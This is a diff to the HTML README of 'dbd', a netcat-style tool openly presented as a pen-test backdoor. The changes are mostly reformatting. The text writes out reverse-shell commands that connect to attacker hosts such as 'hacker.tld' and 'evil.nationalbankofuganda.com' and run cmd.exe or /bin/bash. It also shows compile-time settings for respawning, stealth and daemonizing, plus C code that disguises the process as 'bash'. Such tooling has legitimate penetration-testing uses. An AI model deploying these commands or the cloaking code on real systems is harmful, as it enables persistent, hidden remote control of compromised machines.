@@ -56,41 +56,60 @@ and binaries are distributed under the GNU General Public License.</p>
 
 <h3>COMPILATION</h3>
 
+<pre><code>$ make
+usage:
+  make unix     - Linux, NetBSD, FreeBSD, OpenBSD
+  make sunos    - SunOS (Solaris)
+  make win32    - native win32 console app (w/ Cygwin + MinGW)
+  make win32bg  - create a native win32 no-console app (w/ Cygwin + MinGW)
+  make win32bg CFLAGS=-DSTEALTH - stealthy no-console app
+  make mingw    - native win32 console app (w/ MinGW MSYS)
+  make mingwbg  - native win32 no-console app (w/ MinGW MSYS)
+  make mingwbg CFLAGS=-DSTEALTH - stealthy no-console app (w/ MinGW MSYS)
+  make cygwin   - Cygwin console app
+  make darwin   - Darwin
+
+roll up a tarball (move your compiled stuff to binaries/ first:
+  make dist     - create tarball with source files, readme, and binaries/
+</code></pre>
+
 <p>To compile dbd under a Unix-like operating system you need gcc and relevant
 development tools. For Linux, FreeBSD, NetBSD, OpenBSD (and possibly others),
-type:
-        $ make unix</p>
+type:</p>
+
+<pre><code>$ make unix
+</code></pre>
 
 <p>For SunOS/Solaris, type:</p>
 
-<pre><code>    $ make sunos
+<pre><code>$ make sunos
 </code></pre>
 
 <p>To compile dbd under Microsoft Windows (NT/2K/XP/2K3) you need MinGW+MSYS, or
 Cygwin with full development support (Cygwin's MinGW gcc). To compile a native
 Win32 dbd console application under Cygwin, type:</p>
 
-<pre><code>    $ make win32
+<pre><code>$ make win32
 </code></pre>
 
 <p>or, under MSYS:</p>
 
-<pre><code>    $ make mingw
+<pre><code>$ make mingw
 </code></pre>
 
 <p>To compile a no-console ("WinMain") application under Cygwin, type:</p>
 
-<pre><code>    $ make win32bg
+<pre><code>$ make win32bg
 </code></pre>
 
 <p>or, under MSYS:</p>
 
-<pre><code>    $ make mingwbg
+<pre><code>$ make mingwbg
 </code></pre>
 
 <p>To compile a Cygwin-specific console application, type:</p>
 
-<pre><code>    $ make cygwin
+<pre><code>$make cygwin
 </code></pre>
 
 <p>You may want to change the default behaviour of dbd. One of the most important
@@ -103,60 +122,62 @@ Complete examples are provided in dbd.h.</p>
 
 <p>With a little imagination, dbd can be used for many things...</p>
 
-<pre><code>* Use dbd to securely transfer files between two networks:
+* Use dbd to securely transfer files between two networks:
 
-    snafu$ dbd -l -p 12345 -k secret &gt; output.file
+<pre><code>snafu$ dbd -l -p 12345 -k secret &gt; output.file
 
-    fubar$ cat input.file | dbd -k secret snafu 12345
+fubar$ cat input.file | dbd -k secret snafu 12345
 </code></pre>
 
-<p>or from win32:
-        C:\somedir&gt;type input.fil | dbd -k secret snafu 12345</p>
+<p>or from win32:</p>
+<pre><code>C:\somedir&gt;type input.fil | dbd -k secret snafu 12345
+</code></pre>
 
-<pre><code>* Use dbd as a simple (but secure) chat:
+<p>
+* Use dbd as a simple (but secure) chat:
+</p>
 
-    snafu$ dbd -P snafu -Hon fubar 1234
+<pre><code>snafu$ dbd -P snafu -Hon fubar 1234
 
-    fubar$ dbd -Pfubar -Hon -l -p 1234
+fubar$ dbd -Pfubar -Hon -l -p 1234
+</code></pre>
 
 * Use dbd as a pen-test backdoor:
 
-    C:\hacked box&gt;dbdbg.exe -r1800 -q -e cmd.exe hacker.tld 443
-    ...
+<pre><code>C:\hacked box&gt;dbdbg.exe -r1800 -q -e cmd.exe hacker.tld 443
+...
 </code></pre>
 
 <p>or under Unix-like OSes:</p>
 
-<pre><code>    root@owned# ./dbd -r1800 -Don -e /bin/bash hacker.tld 993
+<pre><code>root@owned# ./dbd -r1800 -Don -e /bin/bash hacker.tld 993
 </code></pre>
 
 <h3>HARD CODING OPTIONS</h3>
 
-<p>In addition to using command line options, you can hard code variables by using</p>
-
-<h1>defines in dbd.h.  To do this, set the variables you wish to use as named</h1>
-
-<p>constants and compile as normal.  For example, if you wanted to hard code a dbd
+<p>In addition to using command line options, you can hard code variables by using
+#defines in dbd.h.  To do this, set the variables you wish to use as named
+constants and compile as normal.  For example, if you wanted to hard code a dbd
 executable that connected back to "evil.nationalbankofuganda.com" on port 995,
 and executed "/bin/bash" you could run:</p>
 
-<pre><code>    root@owned# ./dbd -e /bin/bash evil.nationalbankofuganda.com 995
+<pre><code>root@owned# ./dbd -e /bin/bash evil.nationalbankofuganda.com 995
 </code></pre>
 
 <p>or using hard-coded #defines, you could edit dbd.h:</p>
 
-<pre><code>    #define DOLISTEN 0
-    #define HOST "evil.nationalbankofuganda.com"
-    #define PORT 995
-    #define EXECPROG "/bin/bash"
+<pre><code>#define DOLISTEN 0
+#define HOST "evil.nationalbankofuganda.com"
+#define PORT 995
+#define EXECPROG "/bin/bash"
 </code></pre>
 
 <p>You can also set respawn and stealth options to help maintain your connection:</p>
 
-<pre><code>    #define RESPAWN_ENABLED 1
-    #define RESPAWN_INTERVAL 900
-    #define QUIET 1
-    #define DAEMONIZE 1
+<pre><code>#define RESPAWN_ENABLED 1
+#define RESPAWN_INTERVAL 900
+#define QUIET 1
+#define DAEMONIZE 1
 </code></pre>
 
 <p>This will set the connection to daemonize ("melt" in malware terms), never send
@@ -169,7 +190,7 @@ it ever disconnect from the listener.</p>
 options into your backdoor, you can use what is quite possibly the most fun
 named constant at our disposal: CLOAK.  To do this, simply set the value:</p>
 
-<pre><code>    #define CLOAK 1
+<pre><code>#define CLOAK 1
 </code></pre>
 
 <p>NOTE: this currently only works on *nix compiles.  Eventually I plan on adding
@@ -185,25 +206,25 @@ system it's gonna be fun picking the right pid to kill. ;)</p>
 
 <p>Feel free to use this scrubber in anything you happen to be working on:</p>
 
-<pre><code>    //grab our named constant
-    int cloak = CLOAK;
+<pre><code>//grab our named constant
+int cloak = CLOAK;
 
-    //Engage cloaking device
-    if(cloak)
-    {
-        #ifdef WIN32
-        //stub              
-        #else
-        //change argv[0] to say bash       
-        int scrub;
-        strncpy((char *)argv[0], "\0", strlen((char *)argv[0]) + 1);
-        strcpy((char *)argv[0], "bash\0");    
-        for (scrub = 1; scrub &lt; argc; scrub++)
-        {                     
-             strncpy((char *)argv[scrub], "\0", strlen((char *)argv[scrub]) + 1);
-        }                 
-        #endif
-    }
+//Engage cloaking device
+if(cloak)
+{
+    #ifdef WIN32
+    //stub              
+    #else
+    //change argv[0] to say bash       
+    int scrub;
+    strncpy((char *)argv[0], "\0", strlen((char *)argv[0]) + 1);
+    strcpy((char *)argv[0], "bash\0");    
+    for (scrub = 1; scrub &lt; argc; scrub++)
+    {                     
+         strncpy((char *)argv[scrub], "\0", strlen((char *)argv[scrub]) + 1);
+    }                 
+    #endif
+}
 </code></pre>
 
 <h3>WARNING</h3>
